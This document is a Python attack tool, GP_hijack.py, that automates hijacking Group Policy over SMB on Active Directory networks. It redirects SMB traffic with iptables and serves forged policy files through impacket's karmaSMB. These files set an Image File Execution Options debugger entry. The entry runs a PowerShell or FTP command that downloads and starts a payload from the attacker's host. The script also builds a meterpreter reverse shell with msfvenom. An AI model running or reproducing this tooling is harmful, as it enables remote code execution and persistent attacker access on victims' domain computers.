#!/usr/bin/python3

# _authors_:
#  QSmth (@Qsmthn) 
#  Shikari (@Lukesparamore)

import textwrap
import argparse
import os
import sys
import time
import fileinput

#=== Print style ===
print_style = {
    'empty' : "\n"+"="*8 + " ",
    'question' : "\n"+ " |Quiz| "+" "*1,
    'error' : "\n"+ "|Error|"+" "*2,
    'status' : "\n"+ "|Status|"+" "*1,
    'tab' : " "*9  
    }

script_name = "GP_hijack.py"

#=== Path to folders/files ===
#Get user path (~ for root is /usr/root)
tilda = os.path.expanduser('~')
name_working_folder = 'GPhijack'
path_config_vsftpd = '/etc/vsftpd.conf' 
path_folder_ftp = '/srv/ftp/'
path_folder_apache2 = '/var/www/html/'

#path name where we working
working_path = tilda + '/' + name_working_folder + '/'

#=== Files which karmaSMB will be use ===
all_files =  {
    "INI": 
        {
        "name":"GPT.INI",
        "content":""
        },
    "inf": 
        {
        "name":"GptTmpl.inf",
        "content":""
        },
    "conf": 
        {
        "name":"KarmaHijack.conf",
        "content":""
        },
    "xml": 
        {
        "name":"Registry.xml",
        "content":
            {
            #
            "clsid":"{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}",
            #uid 
            "uid":"{EDB6542F-F709-43B3-92E4-D40109D97B06}",
            #(hive)main_folder
            "hive":"HKEY_LOCAL_MACHINE",
            #(key) path 
            "key_path":"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\",
            "key_folder":"calc.exe",            
            #(name) of value
            "name":"debugger",
            #(type) of value
            "type":"REG_SZ",
            #(value) programm to debug
            "value":"notepad.exe", 
            #(changed)
            "changed":"2016-01-15 17:34:45"
            }
        },
    "log":
        {
        "name":"KarmaSMB.log",
        "content":""
        },
    "script_conf":
        {
        "name":"." + script_name.split('.')[0] + ".conf",
        "content":""
        }
    }

#=== Content of folders/files ===
text_ini_start_version = 10000

#=== Impacket ===
impacket_source = 'https://www.coresecurity.com/system/files/'
impacket_file_name = 'impacket-0.9.9.9.zip'

#=== Iptables rules ===
#                445: REDIRECT   tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:445 redir ports 445
#                139: REDIRECT   tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:445 redir ports 445
#                138: REDIRECT   udp  --  0.0.0.0/0            0.0.0.0/0            udp dpt:138 redir ports 445
iptables_rules_ports = {
                445:"tcp",
                139:"tcp",
                138:"udp"}
iptables_rules_check = []


#=== Shell/Payload/Regster ===
#name with extension
name_of_shell = "shell_xx.exe"
shell_delivery_method_default = "PowerShell"

#=== Services ===
all_services = {
    "powershell" : "apache2",
    "ftp" : "vsftpd"
}

#=== Parser ===
parser = argparse.ArgumentParser(
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50,width=100),
    description = textwrap.dedent('''
        This script will help you to automate SMB Hijacking attack
        ''')
    )
parser.add_argument("mode", choices=['setup','run','config','read'],help="setup - to install impacket and config files; run - to run attack; config - to customize payload; read - to read current configuration")
#[setup]
parser.add_argument("-lip","--local_ip", help="|setup| your IP address")
#[run]
parser.add_argument("-sip", nargs='+', help="|run| IP(s) of Active Airectory server(s) , for which smb2 traffic should be redirected")
#[config]
parser.add_argument("-shway", help="|config| choose way to deliver shell", choices=all_services.keys())
parser.add_argument("-shpath", help="|config| specify path to your shell. Use: '-shpath msf' for default shell")

args = parser.parse_args()

#! Yeahh, I know - file names are global. They do not used as a function parameters
class setup:
    class create:
        def service_vsftpd():
            answer_method_vsftp = input(print_style['question'] + "Have you already installed vsftpd? [y/n] : ")
            if answer_method_vsftp == "n":    
                print(print_style['tab'] + "vsftpd will be installed\n")
                os.system("apt-get install vsftpd")

            print(print_style['status'] + "Trying to modify vsftpd.conf")
            print(print_style['tab'] + "Previous config will be backed up")

            if os.path.isfile(path_config_vsftpd):

                os.system("mv " + path_config_vsftpd + " " + path_config_vsftpd + ".bak")

                vsftpd_conf_bak_file = open(path_config_vsftpd + ".bak", 'r')
                vsftpd_conf_text = vsftpd_conf_bak_file.read()

                vsftpd_conf_text = vsftpd_conf_text.replace('listen=NO', 'listen=YES')
                vsftpd_conf_text = vsftpd_conf_text.replace('listen_ipv6=YES', 'listen_ipv6=NO')
                vsftpd_conf_text = vsftpd_conf_text.replace('anonymous_enable=NO', 'anonymous_enable=YES')

                vsftpd_conf_file = open(path_config_vsftpd, 'w+')
                vsftpd_conf_file.write(vsftpd_conf_text)

                vsftpd_conf_file.close()
                vsftpd_conf_bak_file.close()

                print(print_style['tab'] + "Result: Success")

            else:
                print(print_style['error'] + 'Result: Failed, config file not found')
                print(print_style['tab'] + 'Please modify your vsftpd.conf as:')
                print(print_style['tab'] + '     listen=YES')
                print(print_style['tab'] + '     listen_ipv6=NO')
                print(print_style['tab'] + '     anonymous_enable=YES')
        def text_payload_inf_shell(all_about_shell,local_ip):
            ftp_script_name = "script.txt"

            head = textwrap.dedent("""\
                [Unicode]
                Unicode=yes
                [Registry Values]
                """)
            body = ""
            tail = textwrap.dedent("""
                [Version]
                signature="$CHICAGO$"
                Revision=1
                """)

            register_path = {
                #IFEO = ImageFileExecutionOptions
                "IFEO" : "MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\",
                "Security" : ""
                }

            if all_about_shell['way'] == "powershell":
                body = "PowerShell \"-nologo (New-Object System.Net.WebClient).DownloadFile(\'http://" + local_ip + "/" + all_about_shell['name'] + "\',\'" + all_about_shell['name'] + "\'); Start-Process \'" + all_about_shell['name'] +"\'\""

            #Works perfectly if such shell file does not exist
            #So, to make it works properly - change shell name time to time
            elif all_about_shell['way'] == "ftp":
                body = "cmd.exe /c \"@echo open " + local_ip + ">" + ftp_script_name + \
                        "&@echo binary>>" + ftp_script_name + \
                        "&@echo get /" + all_about_shell['name'] + " C:\\Users\\Public\\Downloads\\" + all_about_shell['name'] + ">>" + ftp_script_name + \
                        "&@echo quit>>" + ftp_script_name+"&@ftp -s:" + ftp_script_name + " -v -A&@start C:\\Users\\Public\\Downloads\\" + all_about_shell['name'] + '\"' + \
                        "&@del script.txt" 


            shell_str = head + \
                        register_path["IFEO"] + \
                        all_about_shell['debug_programm'] + \
                        "\Debugger=1," + \
                        body + \
                        tail
            return({'full':shell_str,'body':body})
        def text_payload_xml_shell(uid,key_folder,value):
            out = ("<?xml version=\"1.0\" encoding=\"utf-8\"?>",
                    "<RegistrySettings clsid=\"{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}\">" + \
                    "<Registry clsid=\"" + all_files["xml"]["content"]["clsid"] + "\" " + \
                    "name=\"debugger\" status=\"debugger\" image=\"5\" " + \
                    "changed=\"" + all_files["xml"]["content"]["changed"] + "\" " + \
                    "uid=\"" + uid + \
                    "\"><Properties action=\"C\" displayDecimal=\"1\" default=\"0\" "+ \
                    "hive=\"" + all_files["xml"]["content"]["hive"] + "\" " + \
                    "key=\"" + all_files["xml"]["content"]["key_path"] + key_folder + "\" " + \
                    "name=\"" + all_files["xml"]["content"]["name"] + "\" " + \
                    "type=\"" + all_files["xml"]["content"]["type"] + "\" " + \
                    "value=\"" + value + "\"/></Registry>",
                    "</RegistrySettings>")
            return('\n'.join(out))

    class shell:
        def way(way):
            if way == "ftp":
                setup.create.service_vsftpd()                
            elif way == "powershell":
                print(print_style['status'] + "Powershell will be used\n")
            else:
                print(print_style['error'] + "Default value will be used\n")

        #argument = path to shell
        #copy shell to some folder, depending on type 
        def path(all_about_shell):
            if (all_about_shell['type'] == "custom"):
                shell_path_not_correct = True

            #!TODO:Rewrite tihs
            #   When fuction called from setup mode 'path' must be empty
            #   When called from config mode, we can use 'path' value
                full_path = all_about_shell['path'] + all_about_shell['name']
                if os.path.isfile(full_path):
                    shell_path_not_correct = False

                else:
                    while shell_path_not_correct:
                        shell_path = input(print_style['tab'] + "Full path to your shell (without ~): ")
                        if(os.path.isfile(shell_path) == False):
                            print(print_style['error'] + "No such file, try again.\n")
                        else:
                            shell_path_not_correct = False                           
                            
                            path_position = shell_path.rfind('/')
                            all_about_shell['path'] = shell_path[:path_position + 1]

                            all_about_shell['name'] = shell_path.split('/')[-1]
                
                if shell_path_not_correct == False:                    
                    if all_about_shell['way'] == "powershell":
                        folder = path_folder_apache2
                        os.system("cp -f " + all_about_shell['path'] + all_about_shell['name'] + " " + path_folder_apache2)
                    elif all_about_shell['way'] == "ftp":
                        folder = path_folder_ftp
                        os.system("cp -f " + all_about_shell['path'] + all_about_shell['name'] + " " + path_folder_ftp)

            elif all_about_shell['type'] == "msf":

                if all_about_shell['way'] == "powershell":
                    folder = path_folder_apache2

                elif all_about_shell['way'] == "ftp":
                    folder = path_folder_ftp

                #[setup] if shell wasn't created
                if not all_about_shell['path']:
                    local_port = input(print_style['question'] + "Please type metasploit listener port number : ")

                    print(print_style['status'] + "Please wait; msfvenom is working")
                    print("         meterpreter would be at {0}:{1}".format(args.local_ip,local_port))

                    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + args.local_ip + " LPORT=" + local_port + " -f exe > " + folder + all_about_shell['name'])
                    
                #[config] if you need just copy shell to some folder
                else:
                    os.system("cp -f " + all_about_shell['path'] + all_about_shell['name'] + " " + folder + all_about_shell['name']) 

            all_about_shell['path'] = folder

            return(all_about_shell)

    class rewrite:
        class basic:
            def write_to_file(extension,need_to_dedent):
                if need_to_dedent:                
                    all_files[extension]["content"] = textwrap.dedent(all_files[extension]["content"])

                file_to_write = open(working_path + all_files[extension]["name"], 'w')
                file_to_write.write(all_files[extension]["content"])
                file_to_write.close() 
                print(print_style['tab'] + 'File ' + working_path + all_files[extension]["name"] + ' was created')

        def ini():
            all_files["INI"]["content"]= """\
            [General]
            Version=10000
            """
            setup.rewrite.basic.write_to_file("INI",True)
        def conf():
            all_files["conf"]["content"] = """\
            INI = """ + working_path + all_files["INI"]["name"] + """
            inf = """ + working_path + all_files["inf"]["name"] + """
            xml = """ + working_path + all_files["xml"]["name"] + """
            """

            setup.rewrite.basic.write_to_file("conf",True)
        def inf(all_about_shell,ip):
            shell_dict = setup.create.text_payload_inf_shell(all_about_shell,ip)
         
            all_files["inf"]["content"] = shell_dict['full']

            setup.rewrite.basic.write_to_file("inf",True)
        def xml(all_about_shell,ip):
            shell_dict = setup.create.text_payload_inf_shell(all_about_shell,ip)

            all_files["xml"]["content"] = setup.create.text_payload_xml_shell(
                    all_files["xml"]["content"]["uid"],
                    all_about_shell["debug_programm"],
                    shell_dict['body'])

            setup.rewrite.basic.write_to_file("xml",True)
        def script_conf(all_about_shell):
            all_files["script_conf"]["content"] = """\
            way = """ + all_about_shell['way'] + """
            shell_type = """ + all_about_shell['type'] + """
            shell_name = """ + all_about_shell['name'] + """
            shell_path = """ + all_about_shell['path'] + """
            shell_programm_to_debug = """ + all_about_shell['debug_programm'] + """
             """

            setup.rewrite.basic.write_to_file("script_conf",True)

    def stage0_create_dir(self):
        print(print_style['empty'] + "Setup[0] creating directory")
        os.system("rm -rf " + working_path)
        os.system("mkdir " + working_path) 
 
    def stage1and2_impacket(self,impacket_source,impacket_file_name):
        print(print_style['empty'] + "Setup[1] downloading impacket")
        os.system("wget " + impacket_source + impacket_file_name + " -P " + working_path)       
 
        print(print_style['empty'] + "Setup[2] unzip and install impacket")
        os.system("unzip "+ working_path + impacket_file_name + " -d " + working_path)
        os.chdir(working_path + "impacket/")
        os.system("python setup.py install")
    
    def stage3_payload(self,all_about_shell):
        print(print_style['empty'] + "Setup[3] payload")

        #Way to deliver
        print(print_style['question'] + "Choose how your shell your will be delivered. [default is 0]")
        print(print_style['tab'] + "0. Via PowerShell and Apache")
        print(print_style['tab'] + "1. Via FTP (vsftpd)")
        answer_method = input(print_style['tab'] + " : ")

        if answer_method == "0":
            all_about_shell['way'] = 'powershell'

        elif answer_method == "1":
            all_about_shell['way'] = 'ftp'

        else:
            print(print_style['error'] + "Default value will be used\n")
            all_about_shell['way'] = shell_delivery_method_default

        setup.shell.way(all_about_shell['way'])

        #Path to shell        
        print(print_style['question'] + "Choose which type of shell you want to use. [default is 0]")
        print(print_style['tab'] + "0. Reverse shell created via msfvenom. Run with metasploit")
        print(print_style['tab'] + "1. Custom shell")
        answer = input(print_style['tab'] + " : ")
        
        #Сustom
        if answer == "0":
            all_about_shell['type'] = 'msf'
        elif answer == "1":
            all_about_shell['type'] = 'custom'

        all_about_shell = setup.shell.path(all_about_shell)

        return(all_about_shell)

    def stage4_create_files(self, all_about_shell):
        print("\n"+"="*8+" Setup[4] create config files")

        #Create files
        setup.rewrite.ini()
        setup.rewrite.conf()
        setup.rewrite.inf(all_about_shell,args.local_ip)
        setup.rewrite.xml(all_about_shell,args.local_ip)
        setup.rewrite.script_conf(all_about_shell)

class run:
    def kill_karmaSMB(self):
        #Because there are more that one process karmaSMB
        for i in range(2):
            os.system("kill -9 `ps aux | grep karmaSMB | cut -d '\n' -f 2 | cut -d ' ' -f 7` 2> /dev/null")
            os.system("kill -9 `ps aux | grep karmaSMB | cut -d '\n' -f 2 | cut -d ' ' -f 6` 2> /dev/null")
            os.system("kill -9 `ps aux | grep karmaSMB | cut -d '\n' -f 1 | cut -d ' ' -f 7` 2> /dev/null")
            os.system("kill -9 `ps aux | grep karmaSMB | cut -d '\n' -f 1 | cut -d ' ' -f 6` 2> /dev/null")

    def stage0_iptables(self):
        print(print_style['empty'] + "Run[0] create/check iptables rules")
        existing_rules = os.popen("iptables -t nat -L -n").read().splitlines() 

        for ip in args.sip:
            for rule in iptables_rules_ports.keys():    
                iptables_rules_check.append("REDIRECT   " + iptables_rules_ports[rule] + "  --  0.0.0.0/0            " + ip + " "*(21-len(ip)) + iptables_rules_ports[rule]   + " dpt:" + str(rule) + " redir ports 445")
        
        if (set(iptables_rules_check) < set(existing_rules)):
            print(print_style['tab'] + "|Check| = rules already exist")
        else:
            print(print_style['tab'] + "|Check| = " + str(len(args.sip)*3) + " rules will be created:")
            for ip in args.sip:  
                for rule in iptables_rules_ports.keys():
                    os.system("iptables -t nat -A PREROUTING -p "+ iptables_rules_ports[rule] + " -d " + ip + " --dport " + str(rule) + " -j REDIRECT --to-port 445")
                    print(print_style['tab'] + "iptables -t nat -A PREROUTING -p "+ iptables_rules_ports[rule] + " -d " + ip + " --dport " + str(rule) + " -j REDIRECT --to-port 445")

    def stage1_increment_version(self):
        print(print_style['empty'] + "Run[1] increment version in gpt.inin")

        #Open file
        file_ini = open(working_path + all_files["INI"]["name"],'r')
        ini_existed_text = file_ini.read().splitlines()

        #Looking for version number
        number = int(ini_existed_text[1].split('=')[1])
        number = number + 1

        print(print_style['tab'] + "next version will be " + str(number))
        ini_existed_text[1] = 'Version=' + str(number)

        #Delete file
        os.remove(working_path + all_files["INI"]["name"],)
        file_ini.close()

        #Create file again
        os.system("touch " + working_path + all_files["INI"]["name"])
        #Open and write new version

        file_ini = open(working_path + all_files["INI"]["name"],'w')
        file_ini.write('\n'.join(ini_existed_text))
        file_ini.close()

    def stage2_check_services(self):
        print(print_style['empty'] + "Run[2] check services")

        config_is_correct = False

        all_about_shell = c.read_config(working_path + all_files['script_conf']['name'])

        if all_about_shell['way']  == "powershell" or all_about_shell['way'] == "ftp":
            print(print_style['status'] + "Service to run: " + all_services[all_about_shell['way']])
            print(print_style['tab'] + "Shell name: " + all_about_shell['name'] + '\n')

            sevice = os.popen("service " + all_services[all_about_shell['way']] +" status").read().splitlines() 
            print('\n'.join(sevice))
            if "dead" in sevice[2]:
                print(print_style['status'] + "[starting " + all_services[all_about_shell['way']] + " service]")
                os.system("service " + all_services[all_about_shell['way']] + " start")
            elif "active" in sevice[2]:
                print(print_style['status'] + "[" + all_services[all_about_shell['way']] + " is already started]")

            config_is_correct = True
        else:
            print(print_style['error'] + 'Config is broken: no such delivery type\n')
        return(config_is_correct)

    def stage3_run_karmaSMB(self):

        print(print_style['empty'] + "Run[3] run karmaSMB")        
        try:
            msg_log = '\n'+ '='*10 + ' ' + time.strftime('%d.%m.%y %H:%M:%S') +  " karmaSMB log " + '='*10 + '\n'
            file_log = open(working_path + all_files["log"]["name"],'a')
            file_log.write(msg_log)
            file_log.close()
            os.system("karmaSMB.py -config " + working_path + all_files['conf']['name'] + " " + working_path + all_files['conf']['name'] + " | tee -a " + working_path + all_files['log']['name']) 
        
        except KeyboardInterrupt:
            #stop karmaSMB - never working 
            os.system("kill -9 `ps aux | grep karmaSMB | cut -d '\n' -f 1 | cut -d ' ' -f 7` 2> /dev/null")
            sys.exit()

class config:
    def read_config(self, path_to_config):
        all_about_shell = {}

        config_file = open(path_to_config,'r')
        confit_text = config_file.read()

        all_about_shell['way'] = confit_text.splitlines()[0].split(' = ')[1]
        all_about_shell['type'] = confit_text.splitlines()[1].split(' = ')[1]
        all_about_shell['name'] = confit_text.splitlines()[2].split(' = ')[1]
        all_about_shell['path'] = confit_text.splitlines()[3].split(' = ')[1]
        all_about_shell['debug_programm'] = confit_text.splitlines()[4].split(' = ')[1]

        config_file.close()

        print(print_style['status'] + " Delivery way: " + all_about_shell['way'])
        print(print_style['tab'] + "   Shell type: " + all_about_shell['type'])
        print(print_style['tab'] + "         name: " + all_about_shell['name']) 
        print(print_style['tab'] + "         path: " + all_about_shell['path']) 
        print(print_style['tab'] + "Prog to debug: " + all_about_shell['debug_programm']) 

        return(all_about_shell)


if args.mode == 'setup':
    s = setup()

    if args.local_ip:

        s.stage0_create_dir()

        answer = input(print_style['question'] + "Did you already install Impacket? [y/n] : ")

        if answer == 'n':
            s.stage1and2_impacket(impacket_source,impacket_file_name)          

        elif answer == 'y':
            print(print_style['tab'] + "... skipping Setup[1] and Setup[2] then")            

        #TODO: if type is msf name shell must be random

        all_about_shell = {
            "way" : "",
            "type" : "",
            "name" : "shell.exe",
            "path" : "",
            "debug_programm" : "taskhost.exe"
        }

        all_about_shell = s.stage3_payload(all_about_shell)
        print(all_about_shell)
        s.stage4_create_files(all_about_shell) 

        print("-"*50 + "\nSetup successfully completed\n" + "-"*50)
        
    else:
        print("In setup mode you need to specify your local ip")
        print("Example usage: " + script_name + " setup -lip 192.168.1.100")

elif args.mode == 'run':

    r = run()
    c = config()

    r.kill_karmaSMB()

    if args.sip:
        answer = input("Quick quiz: Did you setup your metasploit to handle meterpreter session? [y/n] : ")
        if answer == 'y':
            r.stage0_iptables()        
            r.stage1_increment_version()
            if r.stage2_check_services():
                r.stage3_run_karmaSMB()
        elif answer == 'n':
            print("You need to run:")
            print("    [0] msfconsole")
            print("    [1] use multi/handler")
            print("    [2] set payload windows/meterpreter/reverse_tcp")
            print("    [3] set LPORT <your_local_ip>")
            print("    [4] set LPORT <your_local_msf_port>")
    else:
        print(print_style['error'] + "You need to specify IP address(es) of AD server(s)") 
        print(print_style['tab'] + "Example usage: " + script_name + " run -sip 192.168.10.2 192.168.10.3 192.168.10.4")
        sys.exit(0)

#TODO: add functions call
elif args.mode == 'config':
    c = config()

    all_about_shell = c.read_config(working_path + all_files['script_conf']['name'])

    if args.shway or args.shpath:

        answer_ip = input(print_style['question'] + "Your ip : ")

        all_about_shell['debug_programm'] = input(print_style['question'] + "Programm to debug (with .exe) : ")

        if args.shway:
            all_about_shell['way'] = args.shway

            #Do you need to install vsftpd?
            setup.shell.way(all_about_shell['way'])
             
        if args.shpath:
            
            if args.shpath == "msf":

                all_about_shell['type'] = 'msf'

            else:
                all_about_shell['type'] = 'custom'

                path_position = args.shpath.rfind('/')
                all_about_shell['path'] = args.shpath[:path_position + 1]
                all_about_shell['name'] = args.shpath.split('/')[-1]

        #Copying
        all_about_shell = setup.shell.path(all_about_shell)

        setup.rewrite.inf(all_about_shell,answer_ip)
        setup.rewrite.xml(all_about_shell,answer_ip)
        setup.rewrite.script_conf(all_about_shell)

    else:
        print(print_style['tab'] + "You need to specify way to deliver payload and (or) path to payload")
        print(print_style['tab'] + "Example usage #1 (default msf shell): " + script_name + " config -shpath msf")
        print(print_style['tab'] + "Example usage #2 (custom shell)     : " + script_name + " config -shway ftp -shpath /root/shells/my_shell.exe")

elif args.mode == 'read':
    if os.path.isfile(working_path + all_files['script_conf']['name']):
        c = config()
        all_about_shell = c.read_config(working_path + all_files['script_conf']['name'])
    else:
        print(print_style['error'] + 'Config not found')
